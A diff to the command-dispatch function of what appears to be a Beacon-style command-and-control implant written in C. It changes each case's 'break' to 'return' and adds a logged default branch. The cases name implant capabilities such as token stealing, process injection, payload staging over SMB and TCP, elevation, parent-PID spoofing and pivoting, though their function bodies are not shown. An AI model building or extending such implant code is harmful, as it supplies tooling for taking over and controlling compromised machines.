@@ -24,229 +24,232 @@ void TaskDispatch(int cmd, char* buffer, int size)
 	{
 		case COMMAND_BLOCKDLLS:
 			BlockDlls(buffer, size);
-			break;
+			return;
 		case COMMAND_INLINE_EXECUTE_OBJECT:
 			InlineExecuteObject(buffer, size);
-			break;
+			return;
 		case COMMAND_LSOCKET_BIND_LOCALHOST:
 			ChannelLSocketBind(buffer, size, LOCALHOST);
-			break;
+			return;
 		case COMMAND_LSOCKET_BIND:
 			ChannelLSocketBind(buffer, size, 0);
-			break;
+			return;
 		case COMMAND_SPAWNU_X86:
 			SpawnUnder(buffer, size, TRUE);
-			break;
+			return;
 		case COMMAND_SPAWNU_X64:
 			SpawnUnder(buffer, size, FALSE);
-			break;
+			return;
 		case COMMAND_SPAWNAS_X86:
 			SpawnAsUser(buffer, size, TRUE);
-			break;
+			return;
 		case COMMAND_SPAWNAS_X64:
 			SpawnAsUser(buffer, size, FALSE);
-			break;
+			return;
 		case COMMAND_LSOCKET_TCPPIVOT:
 			ChannelLSocketTcpPivot(buffer, size);
-			break;
+			return;
 		case COMMAND_ARGUE_ADD:
 			ArgumentAdd(buffer, size);
-			break;
+			return;
 		case COMMAND_ARGUE_REMOVE:
 			ArgumentRemove(buffer, size);
-			break;
+			return;
 		case COMMAND_ARGUE_LIST:
 			ArgumentList();
-			break;
+			return;
 		case COMMAND_TCP_CONNECT:
 			LinkViaTcp(buffer, size);
-			break;
+			return;
 		case COMMAND_PSH_HOST_TCP:
 			PowershellHostTcp(buffer, size);
-			break;
+			return;
 		case COMMAND_JOB_SPAWN_X86:
 			JobSpawn(buffer, size, TRUE, TRUE);
-			break;
+			return;
 		case COMMAND_JOB_SPAWN_X64:
 			JobSpawn(buffer, size, FALSE, TRUE);
-			break;
+			return;
 		case COMMAND_JOB_SPAWN_TOKEN_X86:
 			JobSpawn(buffer, size, TRUE, FALSE);
-			break;
+			return;
 		case COMMAND_JOB_SPAWN_TOKEN_X64:
 			JobSpawn(buffer, size, FALSE, FALSE);
-			break;
+			return;
 		case COMMAND_SPAWN_PROC_X64:
 			SpawnSetTo(buffer, size, FALSE);
-			break;
+			return;
 		case COMMAND_SPAWN_PROC_X86:
 			SpawnSetTo(buffer, size, TRUE);
-			break;
+			return;
 		case COMMAND_FILE_DRIVES:
 			FilesystemDrives(buffer, size);
-			break;
+			return;
 		case COMMAND_FILE_RM:
 			FilesystemRemove(buffer, size);
-			break;
+			return;
 		case COMMAND_STAGE_PAYLOAD_SMB:
 			StagePayloadViaPipe(buffer, size);
-			break;
+			return;
 		case COMMAND_WEBSERVER_LOCAL:
 			WebServerLocal(buffer, size);
-			break;
+			return;
 		case COMMAND_ELEVATE_PRE:
 			IdentityElevatePre(buffer, size);
-			break;
+			return;
 		case COMMAND_ELEVATE_POST:
 			IdentityElevatePost();
-			break;
+			return;
 		case COMMAND_PIPE_OPEN_EXPLICIT:
 			ProtocolSmbOpenExplicit(buffer);
-			break;
+			return;
 		case COMMAND_UPLOAD_CONTINUE:
 			Upload(buffer, size, "wb");
-			break;
+			return;
 		case COMMAND_UPLOAD:
 			Upload(buffer, size, "ab");
-			break;
+			return;
 		case COMMAND_JOB_REGISTER:
 			JobRegister(buffer, size, FALSE, FALSE);
-			break;
+			return;
 		case COMMAND_JOB_REGISTER_IMPERSONATE:
 			JobRegister(buffer, size, TRUE, FALSE);
-			break;
+			return;
 		case COMMAND_JOB_REGISTER_MSGMODE:
 			JobRegister(buffer, size, FALSE, TRUE);
-			break;
+			return;
 		case COMMAND_EXECUTE_JOB:
 			JobExecute(buffer, size);
-			break;
+			return;
 		case COMMAND_GETPRIVS:
 			IdentityGetPrivileges(buffer, size);
-			break;
+			return;
 		case COMMAND_RUN_UNDER_PID:
 			RunUnderPid(buffer, size);
-			break;
+			return;
 		case COMMAND_PPID:
 			RunSetParentPid(buffer, size);
-			break;
+			return;
 		case COMMAND_FILE_MOVE:
 			FilesystemMove(buffer, size);
-			break;
+			return;
 		case COMMAND_FILE_COPY:
 			FilesystemCopy(buffer, size);
-			break;
+			return;
 		case COMMAND_SETENV:
 			putenv(buffer);
-			break;
+			return;
 		case COMMAND_FILE_MKDIR:
 			FilesystemMkdir(buffer, size);
-			break;
+			return;
 		case COMMAND_STEAL_TOKEN:
 			IdentityStealToken(buffer, size);
-			break;
+			return;
 		case COMMAND_PS_LIST:
 			ProcessList(buffer, size);
-			break;
+			return;
 		case COMMAND_PS_KILL:
 			ProcessKill(buffer, size);
-			break;
+			return;
 		case COMMAND_PSH_IMPORT:
 			PowershellImport(buffer, size);
-			break;
+			return;
 		case COMMAND_RUNAS:
 			RunAsUser(buffer, size);
-			break;
+			return;
 		case COMMAND_PWD:
 			FilesystemPwd();
-			break;
+			return;
 		case COMMAND_JOB_KILL:
 			JobKill(buffer, size);
-			break;
+			return;
 		case COMMAND_JOBS:
 			JobPrintAll();
-			break;
+			return;
 		case COMMAND_PAUSE:
 			Pause(buffer, size);
-			break;
+			return;
 		case COMMAND_LOGINUSER:
 			IdentityLoginUser(buffer, size);
-			break;
+			return;
 		case COMMAND_FILE_LIST:
 			FilesystemList(buffer, size);
-			break;
+			return;
 		case COMMAND_STAGE_PAYLOAD:
 			StagePayloadViaTcp(buffer, size);
-			break;
+			return;
 		case COMMAND_LSOCKET_CLOSE:
 			ChannelLSocketClose(buffer, size);
-			break;
+			return;
 		case COMMAND_INJECT_PID_PING:
 			InjectIntoPidAndPing(buffer, size, TRUE);
-			break;
+			return;
 		case COMMAND_INJECTX64_PID_PING:
 			InjectIntoPidAndPing(buffer, size, FALSE);
-			break;
+			return;
 		case COMMAND_TOKEN_REV2SELF:
 			BeaconRevertToken();
-			break;
+			return;
 		case COMMAND_SEND:
 			ChannelSend(buffer, size);
-			break;
+			return;
 		case COMMAND_CLOSE:
 			ChannelClose(buffer, size);
-			break;
+			return;
 		case COMMAND_LISTEN:
 			ChannelListen(buffer, size);
-			break;
+			return;
 		case COMMAND_TOKEN_GETUID:
 			IdentityGetUid();
-			break;
+			return;
 		case COMMAND_PIPE_REOPEN:
 			PipeReopen(buffer, size);
-			break;
+			return;
 		case COMMAND_PIPE_CLOSE:
 			PipeClose(buffer, size);
-			break;
+			return;
 		case COMMAND_PIPE_ROUTE:
 			PipeRoute(buffer, size);
-			break;
+			return;
 		case COMMAND_CANCEL_DOWNLOAD:
 			DownloadCancel(buffer, size);
-			break;
+			return;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
-			break;
+			return;
 		case COMMAND_INJECTX64_PING:
 			SpawnAndPing(buffer, size, FALSE);
-			break;
+			return;
 		case COMMAND_CONNECT:
 			ChannelConnect(buffer, size);
-			break;
+			return;
 		case COMMAND_SPAWN_TOKEN_X86:
 			Spawn(buffer, size, TRUE, FALSE);
-			break;
+			return;
 		case COMMAND_SPAWN_TOKEN_X64:
 			Spawn(buffer, size, FALSE, FALSE);
-			break;
+			return;
 		case COMMAND_SPAWNX64:
 			Spawn(buffer, size, FALSE, TRUE);
-			break;
+			return;
 		case COMMAND_DIE:
 			Die();
-			break;
+			return;
 		case COMMAND_SLEEP:
 			SleepSet(buffer, size);
-			break;
+			return;
 		case COMMAND_CD:
 			FilesystemCd(buffer, size);
-			break;
+			return;
 		case COMMAND_EXECUTE:
 			Execute(buffer, size);
-			break;
+			return;
 		case COMMAND_DOWNLOAD:
 			DownloadDo(buffer, size);
-			break;
+			return;
+		default:
+			LERROR("Unknown command: %d", cmd);
+			return;
 	}
 }
 
